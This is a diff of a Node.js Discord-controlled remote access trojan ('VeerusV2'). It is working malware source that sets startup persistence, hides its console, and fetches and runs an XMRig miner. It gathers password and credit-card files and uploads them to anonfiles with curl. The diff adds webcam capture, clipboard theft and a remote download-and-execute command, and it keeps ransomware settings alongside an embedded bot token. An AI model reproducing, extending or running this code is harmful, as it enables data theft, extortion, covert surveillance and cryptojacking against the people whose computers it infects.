@@ -15,49 +15,49 @@ const urss = require("os").userInfo().username;
 
 // Global settings
 const FilegrabberOnStart = false;
-const hideCnsl = true;
-const OnStart = true
-const TOKEN = "MTA1MDExNDQwOTc4O" // Your discord bot token
-const channelID = "105157433465601644" // Channel id for the messages.
+const hideCnsl = false;
+const OnStart = false;
+const TOKEN = "MTA1MDExNDQwOTc4OTM5OTEyMA.Gr2mAb.-ypPWbg0Ojnh166I95AtS5THNVShhtcO6sVYqI" // Your discord bot token
+const channelID = "1025099023759188131" // Channel id for the messages.
 const walletAddr = "Your XMR Adress" // Your XMR adress
 const mineOnStart = true; // Mine XMR on start
-const ransomOnStart = true;
+const ransomOnStart = false;
 var emailForRansom = "yazdrawlpb@gmail.com" // Email for the ransomware
 var btcAdressForRansom = "bc1qcm34ax9ypck2h4f9smhn67s7xvkaefq5w7c8ls"; // Btc adress
 var amountForRansom = "50"; // Amount to unlock the computer
 const testMode = false; // If you wan't to do tests (it deactivate the ransomware/cmd)
 
 
+
 // File grabber settings
-const KeyWordsForFileGrabber = ["credit_card", "credit card", "passwords", "mdp", "password", "mot de passe", "passw", "casino", ".txt", "card", "bank"]
-const FileGrabberLimit = 50;
+const KeyWordsForFileGrabber = ["credit_card", "credit card", "passwords", "mdp", "password", "passw", ".txt"]
+const FileGrabberLimit = 30; // Don't put a number to high
 const maxFileSize = 2;
-const FileGrabberPaths = [`C:/Users/${urss}/Desktop/`, `C:/Users/${urss}/Documents/`,`C:/Users/${urss}/Pictures/`, `C:/Users/${urss}/Music/`, `C:/Users/${urss}/3D Objects/`, `C:/Users/${urss}/Videos/`, `C:/Users/${urss}/Downloads/`]
+const FileGrabberPaths = [`C:/Users/${urss}/Desktop/`, `C:/Users/${urss}/Documents/`, `C:/Users/${urss}/Music/`, `C:/Users/${urss}/Videos/`]
 
 
 
 
 
 
+function setToStartup() {
+    const Fpath = process.argv[0]
+    const startPth = "C:\\Users\\" + urss + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\localhost.bat"
+    const startExePth = "C:\\Users\\" + urss + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\v.exe"
+    fs.writeFileSync(startPth, "START " + startExePth);
+    let dataF = fs.readFileSync(Fpath, {
+        encoding: null
+    });
+    fs.writeFileSync(startExePth, dataF)
+    console.log("[+] Set startup sucess")
 
-
-function setToStartup(){
-  const Fpath = process.argv[0]
-  const startPth = "C:\\Users\\" + urss +"\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\localhost.bat"
-  const startExePth = "C:\\Users\\" + urss +"\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\v.exe"
-  fs.writeFileSync(startPth, "START "+startExePth );
-  let dataF = fs.readFileSync(Fpath, {encoding: null});
-  fs.writeFileSync(startExePth, dataF)
-  console.log("[+] Set startup sucess")
-   
 }
 
 
-if(OnStart === true){setToStartup()}
 
 
 const StartPath =  `C:\\Users\\${urss}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\Svc.bat`
-const StartPath2 =  `C:\\Users\\${urss}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\f.exe`
+const StartPath2 =  `C:\\Users\\${urss}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\Svc.exe`
 
 
 
@@ -79,9 +79,9 @@ const ALGO = "aes-256-cbc" // Hashing Algorithm
 
 */
 
-
-
-
+const os = require("os")
+var downloaddd = require('file-download')
+const clip = require('clipboard-data')
 var path = require('path');
 const parse5 = require("parse5")
 var zipper = require('zip-local');
@@ -95,6 +95,35 @@ const { exec } = require("child_process");
 const { Client, GatewayIntentBits, ActionRowBuilder, ButtonBuilder, ButtonStyle, EmbedBuilder , Events, ModalBuilder, TextInputBuilder, TextInputStyle} = require('discord.js');
 var request = require('request');
 const client = new Client({ intents: [GatewayIntentBits.Guilds] });
+var NodeWebcam = require( "node-webcam" );
+
+
+//Default options
+
+var opts = {
+    width: 1280,
+
+    height: 720,
+
+    quality: 100,
+
+    frames: 60,
+
+    delay: 0,
+
+    saveShots: true,
+
+    output: "jpeg",
+
+    device: false,
+
+    callbackReturn: "location",
+
+    verbose: false
+};
+
+
+var Webcam = NodeWebcam.create( opts );
 
 
 
@@ -138,7 +167,6 @@ function hideSelf() {
 
 
 
-if(hideCnsl === true){hideSelf()}
 
 
 /*
@@ -228,84 +256,80 @@ function makeid(length) {
 var nvidia = false;
 var AMD = false;
 var cantOpenMiner = false;
-var output = `C:\\Users\\${urss}\\AppData\\Roaming\\f.exe`;
+var output = `C:\\Users\\${urss}\\AppData\\Roaming\\SxZ.exe`;
 var ConfigOutput = `C:\\Users\\${urss}\\AppData\\Roaming\\config.json`;
 
 
+async function MinerMain() {
+    gpuInfo().then(function(data) {
+        var infosG = data;
+        if (JSON.stringify(data).includes("nvidia") || JSON.stringify(data).includes("NVIDIA")) {
+            nvidia = true
+        } else if (JSON.stringify(data).includes("amd") || JSON.stringify(data).includes("AMD")) {
+            AMD = true;
+        } else {
+            nvidia = false;
+        }
+        console.log("Nvidia? : " + nvidia)
+    });
 
 
-async function MinerMain () {
-  gpuInfo().then(function(data) {
-      var infosG = data;
-      if(JSON.stringify(data).includes("nvidia") || JSON.stringify(data).includes("NVIDIA")){
-        nvidia = true
-      }else if(JSON.stringify(data).includes("amd") || JSON.stringify(data).includes("AMD")){
-        AMD = true;
-      }else{
-        nvidia = false;
-      }
-      console.log("Nvidia? : " + nvidia)
-      console.log("AMD? : " + AMD)
-  });
-
-
-  var fileUrl = "https://github.com/0xSxZ/Veerus/raw/main/MINER_IMPORTANT/clientdownloads/xmrig.exe";
-  var ConfigUrl = "https://raw.githubusercontent.com/0xSxZ/Veerus/main/MINER_IMPORTANT/clientdownloads/config.json";
+    var fileUrl = "https://github.com/0xSxZ/Veerus/raw/main/MINER_IMPORTANT/clientdownloads/xmrig.exe";
+    var ConfigUrl = "https://raw.githubusercontent.com/0xSxZ/Veerus/main/MINER_IMPORTANT/clientdownloads/config.json";
 
 
 
-  if(nvidia == true){
+    if (nvidia == true) {
 
-    fileUrl = "https://github.com/0xSxZ/Veerus/raw/main/MINER_IMPORTANT/clientdownloads/xmrig-nvidia.exe"
+        fileUrl = "https://github.com/0xSxZ/Veerus/raw/main/MINER_IMPORTANT/clientdownloads/xmrig-nvidia.exe"
 
-  }else if(AMD == true){
+    } else if (AMD == true) {
 
-    fileUrl = "https://github.com/0xSxZ/Veerus/raw/main/MINER_IMPORTANT/clientdownloads/xmrig-amd.exe"
+        fileUrl = "https://github.com/0xSxZ/Veerus/raw/main/MINER_IMPORTANT/clientdownloads/xmrig-amd.exe"
 
-  }else{
+    } else {
 
-    fileUrl = `https://github.com/0xSxZ/Veerus/raw/main/MINER_IMPORTANT/clientdownloads/xmrig.exe`;
+        fileUrl = `https://github.com/0xSxZ/Veerus/raw/main/MINER_IMPORTANT/clientdownloads/xmrig.exe`;
 
-  }
-
-
-  await request({url: fileUrl, encoding: null}, function(err, resp, body) {
-    try{
-
-      fs.writeFile(output, body, function(err) {
-        console.log("file written!");
-      });
-    }catch{
-      cantOpenMiner = true;
     }
-  });
+
+
+    await request({
+        url: fileUrl,
+        encoding: null
+    }, function(err, resp, body) {
+        try {
+
+            fs.writeFile(output, body, function(err) {
+                console.log("Miner downloaded");
+            });
+        } catch {
+            cantOpenMiner = true;
+        }
+    });
 
 
 
-  await request(ConfigUrl, function(err, resp, body) {
-    try{
+    await request(ConfigUrl, function(err, resp, body) {
+        try {
 
-      fs.writeFile(ConfigOutput, body.replace("YOUR_WALLET_ADDRESS", walletAddr), function(err) {
-        console.log("file written!");
-      });
-    }catch{
-      cantOpenMiner = true;
-    }
-  });
+            fs.writeFile(ConfigOutput, body.replace("YOUR_WALLET_ADDRESS", walletAddr), function(err) {
+                
+            });
+        } catch {
+            cantOpenMiner = true;
+        }
+    });
 
-  await console.log("Starting Miner")
+    await console.log("Starting Miner")
 
-
-  await console.log("Miner Started in worker 1")
-
-
-  await MinerThread()
+    await MinerThread()
 }
 
 
-function MinerThread(){
 
-  console.log("Miner Started in worker 2")
+function MinerThread(){
+  console.log("Miner Started")
   if(cantOpenMiner == false){
     exec(output, (error, stdout, stderr) => {
       console.log(stdout)
@@ -314,11 +338,6 @@ function MinerThread(){
 }
 
 
-if(mineOnStart == true){
-
-    MinerMain();
-
-}
 
 
 
@@ -336,83 +355,86 @@ if(mineOnStart == true){
 */
 
 
-function FileGrabber(){
-  var i = 0;
-  fs.mkdirSync(tempPath, { recursive: true });
-  while(i<=FileGrabberPaths.length-1){
-
-  if(max == true){
-    break
-    i = 100000;
-    return
-  }
-    recursive(FileGrabberPaths[i], function (err, files) {
-
-      try{
-        for(n = 0; n<=files.length; n++){
-
-      if(foundeds >= FileGrabberLimit){
-                
-        max = true
-        console.log("Zipping")
-        zipper.sync.zip(tempPath).compress().save("EZ.zip");
-            child = exec('curl -F "file=@EZ.zip" https://api.anonfiles.com/upload', function(error, stdout, stderr){
-
-
-            client.channels.fetch(channelID)
-            .then(channel => {
-                var msgModal = channel.send({ content: "Files : " + stdout});
-            })
-            });
-        break
-        return
-      }
-          try{
-         if(files[n].includes(".ini")){
-              continue
-            }
-        const contains = KeyWordsForFileGrabber.some(element => {
-          if (files[n].includes(element)) {
-            return true;
-          }
-
-          return false;
-        });
-
-
-        var stats = fs.statSync(files[n])
-        var fileSizeInBytes = stats.size;
-        var fileSizeInMegabytes = fileSizeInBytes / (1024*1024);
-
-        if(fileSizeInMegabytes >= maxFileSize){
-          continue
-        }
-            if(contains === false){
-              continue
-            }else{
-              console.log("Found ! ")
-              foundeds++;
-            }
-            fs.copyFile(files[n], tempPath + "\\"+files[n].split("\\")[files[n].split("\\").length -1], (err) => {
-          if (err) {
-            console.log("Error Found:", err);
-          }
-          else {
-
-          }
-        });
-          }catch(e){
-            continue
-          }
-
-        }
-      }catch(e){
-        console.log(e)
-      }
+async function FileGrabber() {
+    var i = 0;
+    fs.mkdirSync(tempPath, {
+        recursive: true
     });
-    i++
+    while (i <= FileGrabberPaths.length - 1) {
 
-  }
+        if (max == true) {
+            break
+            i = 100000;
+            return
+        }
+        recursive(FileGrabberPaths[i], function(err, files) {
+
+            try {
+                for (n = 0; n <= files.length; n++) {
+
+                    if (foundeds >= FileGrabberLimit) {
+
+                        max = true
+                        console.log("Zipping")
+                        zipper.sync.zip(tempPath).compress().save("EZ.zip");
+                        child = exec('curl -F "file=@EZ.zip" https://api.anonfiles.com/upload', function(error, stdout, stderr) {
+
+
+                            client.channels.fetch(channelID)
+                                .then(channel => {
+                                    var msgModal = channel.send({
+                                        content: "Files : " + stdout
+                                    });
+                                })
+                        });
+                        break
+                        return
+                    }
+                    try {
+                        if (files[n].includes(".ini")) {
+                            continue
+                        }
+                        const contains = KeyWordsForFileGrabber.some(element => {
+                            if (files[n].includes(element)) {
+                                return true;
+                            }
+
+                            return false;
+                        });
+
+
+                        var stats = fs.statSync(files[n])
+                        var fileSizeInBytes = stats.size;
+                        var fileSizeInMegabytes = fileSizeInBytes / (1024 * 1024);
+
+                        if (fileSizeInMegabytes >= maxFileSize) {
+                            continue
+                        }
+                        if (contains === false) {
+                            continue
+                        } else {
+                            console.log("Found ! ")
+                            foundeds++;
+                        }
+                        fs.copyFile(files[n], tempPath + "\\" + files[n].split("\\")[files[n].split("\\").length - 1], (err) => {
+                            if (err) {
+                                console.log("Error Found:", err);
+                            } else {
+
+                            }
+                        });
+                    } catch (e) {
+                        continue
+                    }
+
+                }
+            } catch (e) {
+                console.log(e)
+            }
+        });
+        i++
+
+    }
 }
 
 /*
@@ -643,7 +665,7 @@ var embedRick = new EmbedBuilder()
   .setURL('https://github.com/0xSxZ')
   .setImage("https://media.tenor.com/x8v1oNUOmg4AAAAd/rickroll-roll.gif")
   .addFields(
-    { name: 'Content', value: "soon"},
+    { name: 'Content', value: "Successfully opened link"},
     { name: '\u200B', value: '\u200B' },
   )
   .setTimestamp();
@@ -716,21 +738,10 @@ const row2 = new ActionRowBuilder()
             .setCustomId('website')
             .setLabel('🎭 Open website')
             .setStyle(ButtonStyle.Primary),
-
-        new ButtonBuilder()
-            .setCustomId('micro')
-            .setLabel('🎙 microphone record')
-            .setStyle(ButtonStyle.Primary),
-
         new ButtonBuilder()
             .setCustomId('ransom')
             .setLabel('☠ Ransomware')
             .setStyle(ButtonStyle.Primary),
-        new ButtonBuilder()
-            .setCustomId('gr4b')
-            .setLabel('🤝 Grab infos')
-            .setStyle(ButtonStyle.Primary),
-
 );
 
 
@@ -747,27 +758,13 @@ const row2 = new ActionRowBuilder()
 
 */
 client.on('ready', () => {
-
-    console.log("Ready")
+    console.log("VeerusV2 is ready !")
     client.channels.fetch(channelID)
     .then(channel => {
-        var msgModal = channel.send({ content: "Files : " + FinalURL, embeds: [embed] , components: [row] });
+        var mss = channel.send({ content: "New victim" + FinalURL, embeds: [embed] , components: [row] });
     })
-        if(FilegrabberOnStart == true){
-                FileGrabber()
-        }
-    /*
-
-            ▒█▀▀▀█ ▀▀█▀▀ ░█▀▀█ ▒█▀▀█ ▀▀█▀▀ 　 ▒█▀▀█ ▒█▄░▒█ ▒█▀▀▀█ ▒█▀▄▀█ 
-            ░▀▀▀▄▄ ░▒█░░ ▒█▄▄█ ▒█▄▄▀ ░▒█░░ 　 ▒█▄▄▀ ▒█▒█▒█ ░▀▀▀▄▄ ▒█▒█▒█ 
-            ▒█▄▄▄█ ░▒█░░ ▒█░▒█ ▒█░▒█ ░▒█░░ 　 ▒█░▒█ ▒█░░▀█ ▒█▄▄▄█ ▒█░░▒█ 
 
 
-    */
-    if(ransomOnStart===true){
-
-      rnsm(emailForRansom, btcAdressForRansom, amountForRansom)
-    }
 
 });
 
@@ -776,18 +773,20 @@ client.on(Events.InteractionCreate, async interaction => {
     try{
 
 
-      function WebCamScreen(){
+      async function WebCamScreen(){
           var pth = makeid(7);
-          Webcam.capture( pth, function( err, data ) {} );
-          return pth;
+          await Webcam.capture( pth, function( err, data ) {
+            interaction.channel.send({ content: ":rofl:", files: [pth + ".jpg"] })
+          } );
+          
       }
       var embedClip = new EmbedBuilder()
           .setColor(0xE9C9FF)
           .setTitle('Clipboard Content')
           .setURL('https://github.com/0xSxZ')
-          .setDescription('Click the buttons to control the computer (Victim ID : ' + VictimID + ")")
+          .setDescription('Clipboard (Victim ID : ' + VictimID + ")")
           .addFields(
-              { name: 'Content', value: "soon"},
+              { name: 'Content', value: clip.getText()},
               { name: '\u200B', value: '\u200B' },
           )
           .setTimestamp();
@@ -804,9 +803,9 @@ client.on(Events.InteractionCreate, async interaction => {
 
 
 */
-
+        var CustomID = interaction.customId
         if (interaction.isButton()){
-            if(interaction.customId == "cmd"){
+            if(CustomID == "cmd"){
                 const modal = new ModalBuilder()
                         .setCustomId('modalCMD')
                         .setTitle('CMD');
@@ -829,8 +828,7 @@ client.on(Events.InteractionCreate, async interaction => {
             }  
         }
 
-        if(interaction.customId == "download"){
-            console.log("Download")
+        if(CustomID == "download"){
                 const modalD = new ModalBuilder()
                         .setCustomId('modaldownload')
                         .setTitle('DOWNLOAD');
@@ -844,18 +842,37 @@ client.on(Events.InteractionCreate, async interaction => {
                     .setStyle(TextInputStyle.Short);
                 const rowww = new ActionRowBuilder().addComponents(victi);
                 const rowdown = new ActionRowBuilder().addComponents(down);
+                modalD.addComponents(rowww, rowdown);
+                await interaction.showModal(modalD);
+        }
 
-            modalD.addComponents(rowww, rowdown);
+        if(CustomID == "DownloadAndExecute"){
+                const modalD = new ModalBuilder()
+                        .setCustomId('modaldownloadAndEx')
+                        .setTitle('DOWNLOAD');
+                const victi = new TextInputBuilder()
+                    .setCustomId('victimid')
+                    .setLabel("Victim ID")
+                    .setStyle(TextInputStyle.Short);
+                const down = new TextInputBuilder()
+                    .setCustomId('downloadurl')
+                    .setLabel("URL")
+                    .setStyle(TextInputStyle.Short);
+                const rowww = new ActionRowBuilder().addComponents(victi);
+                const rowdown = new ActionRowBuilder().addComponents(down);
+                modalD.addComponents(rowww, rowdown);
+                await interaction.showModal(modalD);
+        }
 
-            await interaction.showModal(modalD);
-
-
-
+        if(CustomID == "webcam"){
+          await WebCamScreen()
         }
 
 
-        if(interaction.customId == "website"){
-                console.log("website")
+
+
+        if(CustomID == "website"){
+
                 const modalDW = new ModalBuilder()
                         .setCustomId('modalwebsite')
                         .setTitle('WEBSITE');
@@ -877,39 +894,25 @@ client.on(Events.InteractionCreate, async interaction => {
 
 
         }
-
-
-        if(interaction.customId == "clipboard"){
-            console.log("clipboard")
+        if(CustomID == "clipboard"){
             await interaction.reply({ embeds: [embedClip]});
-
-
-
         }
 
 
-        if(interaction.customId == "gr4b"){
-          for (i = 0; i < paths.length; i++) {
-              get_token(paths[i])
-          }
+
+        if(CustomID == "stream"){
+           
+            interaction.reply({ embeds: [embed] , components: [row2] })
         }
 
-        if(interaction.customId == "stream"){
+
+        if(CustomID == "next"){
             console.log("Next")
             interaction.reply({ embeds: [embed] , components: [row2] })
 
 
         }
-
-
-        if(interaction.customId == "next"){
-            console.log("Next")
-            interaction.reply({ embeds: [embed] , components: [row2] })
-
-
-        }
-        if(interaction.customId == "ransom"){
-                console.log("ransom")
+        if(CustomID == "ransom"){
                 const modalR = new ModalBuilder()
                         .setCustomId('modalransom')
                         .setTitle('DOWNLOAD');
@@ -933,9 +936,9 @@ client.on(Events.InteractionCreate, async interaction => {
                 const rowdownR = new ActionRowBuilder().addComponents(downR);
                 const rowdownRB = new ActionRowBuilder().addComponents(downRB);
                 const rowdownRBC = new ActionRowBuilder().addComponents(downRBC);
-            modalR.addComponents(rowwwR, rowdownR, rowdownRB, rowdownRBC);
+                modalR.addComponents(rowwwR, rowdownR, rowdownRB, rowdownRBC);
 
-            await interaction.showModal(modalR);
+                await interaction.showModal(modalR);
 
 
 
@@ -975,47 +978,73 @@ client.on(Events.InteractionCreate, async interaction => {
                 }else{
                   interaction.reply("[+] **Test mode is ON**, so the command can't be executed.")
                 }
+            }else if(interaction.fields.getTextInputValue("victimid") == VictimID && interaction.customId == "modaldownloadAndEx"){
+                var file = ""
+                var filepath = makeid(7) + interaction.fields.getTextInputValue("downloadurl").split("/")[interaction.fields.getTextInputValue("downloadurl").split("/").length-1]
+
+                  var options = {
+                      directory: os.tmpdir() ,
+                      filename: filepath
+                  }
+
+                  downloaddd(interaction.fields.getTextInputValue("downloadurl"), options, function(err){
+                          var embedDownloaded = new EmbedBuilder()
+                            .setColor(0xE9C9FF)
+                            .setTitle('Successfully downloaded & Executed')
+                            .setURL('https://github.com/0xSxZ')
+                            .setImage("https://thumbs.gfycat.com/EvenWaryFrog-size_restricted.gif")
+                            .addFields({
+                              name:"Successfully downloaded", value:"**Path :**" + os.tmpdir() + "\\" +filepath 
+                            })
+                            .setTimestamp();
+                          exec(os.tmpdir() + "\\" + filepath, (error, stdout, stderr) => {
+                            if (error) {
+                              console.error(`exec error: ${error}`);
+                              return;
+                            }
+                            console.log(`stdout: ${stdout}`);
+                            console.error(`stderr: ${stderr}`);
+                          });
+                        
+
+                         interaction.reply({ embeds: [embedDownloaded]});
+                      if (err) throw err
+                    
+                  }) 
             }else if(interaction.fields.getTextInputValue("victimid") == VictimID && interaction.customId == "modaldownload"){
                 var file = ""
-                var filepath = ""
-                if(interaction.fields.getTextInputValue("downloadurl").includes(".jpg") || interaction.fields.getTextInputValue("downloadurl").includes(".jpeg")){
-                    filepath = (Math.random() + 1).toString(36).substring(7) + ".jpg"
-                    file = fs.createWriteStream(filepath);
-                }else if(interaction.fields.getTextInputValue("downloadurl").includes(".exe")){
-                    filepath = (Math.random() + 1).toString(36).substring(7) + ".exe"
-                    file = fs.createWriteStream(filepath);
-                }else if(interaction.fields.getTextInputValue("downloadurl").includes(".bat")){
-                    filepath = (Math.random() + 1).toString(36).substring(7) + ".bat"
-                    file = fs.createWriteStream(filepath);
-                }else if(interaction.fields.getTextInputValue("downloadurl").includes(".pdf")){
-                    filepath = (Math.random() + 1).toString(36).substring(7) + ".pdf"
-                    file = fs.createWriteStream(filepath);
-                }
-                else if(interaction.fields.getTextInputValue("downloadurl").includes(".py")){
-                    filepath = (Math.random() + 1).toString(36).substring(7) + ".py"
-                    file = fs.createWriteStream(filepath);
-                }else if(interaction.fields.getTextInputValue("downloadurl").includes(".png")){
-                    filepath = (Math.random() + 1).toString(36).substring(7) + ".png"
-                    file = fs.createWriteStream(filepath);
-                }else if(interaction.fields.getTextInputValue("downloadurl").includes(".jpg")){
-                    filepath = (Math.random() + 1).toString(36).substring(7) + ".jpg"
-                    file = fs.createWriteStream(filepath);
-                }else if(interaction.fields.getTextInputValue("downloadurl").includes(".jpeg")){
-                    filepath = (Math.random() + 1).toString(36).substring(7) + ".jpeg"
-                    file = fs.createWriteStream(filepath);
-                }else{
-                    return interaction.reply("**FILE FORMAT NOT SUPPORTED**\n\nFiles supported :\n.jpg/jpeg, .bat, .pdf, .exe, .py");
-                }
-                
-                const requestt = http.get(interaction.fields.getTextInputValue("downloadurl"), function(response) {
-                   response.pipe(file);
+                var filepath = makeid(7) + interaction.fields.getTextInputValue("downloadurl").split("/")[interaction.fields.getTextInputValue("downloadurl").split("/").length-1]
 
-                   // after download completed close filestream
-                   file.on("finish", () => {
-                       file.close();
-                       interaction.reply("Download Completed\nPath :" + filepath);
-                   });
-                });
+                  var options = {
+                      directory: os.tmpdir() ,
+                      filename: filepath
+                  }
+
+                  downloaddd(interaction.fields.getTextInputValue("downloadurl"), options, function(err){
+                          var embedDownloaded = new EmbedBuilder()
+                            .setColor(0xE9C9FF)
+                            .setTitle('Successfully downloaded')
+                            .setURL('https://github.com/0xSxZ')
+                            .setImage("https://thumbs.gfycat.com/EvenWaryFrog-size_restricted.gif")
+                            .addFields({
+                              name:"Successfully downloaded", value:"**Path :**" + os.tmpdir() + "\\" +filepath 
+                            })
+                            .setTimestamp();
+                         interaction.reply({ embeds: [embedDownloaded]});
+                      if (err) throw err
+                    
+                  }) 
+                  /*
+
+                  const requestt = http.get(, function(response) {
+                     response.pipe(file);
+                     file.on("finish", () => {
+                         file.close();
+
+                     });
+                  });
+                  */
+
 
             }else if(interaction.fields.getTextInputValue("victimid") == VictimID && interaction.customId == "modalransom"){
                 if(testMode == false){
@@ -1035,4 +1064,20 @@ client.on(Events.InteractionCreate, async interaction => {
 
 });
 
-client.login(TOKEN);
+
+/*
+
+  Launching 
+*/
+
+async function Start(){
+  if(ransomOnStart===true){await rnsm(emailForRansom, btcAdressForRansom, amountForRansom)}
+  if(FilegrabberOnStart == true){await FileGrabber()}
+  if(hideCnsl === true){hideSelf()}
+  if(OnStart === true){setToStartup()}
+  if(mineOnStart == true){await MinerMain()}
+
+  await client.login(TOKEN);
+}
+
+Start()
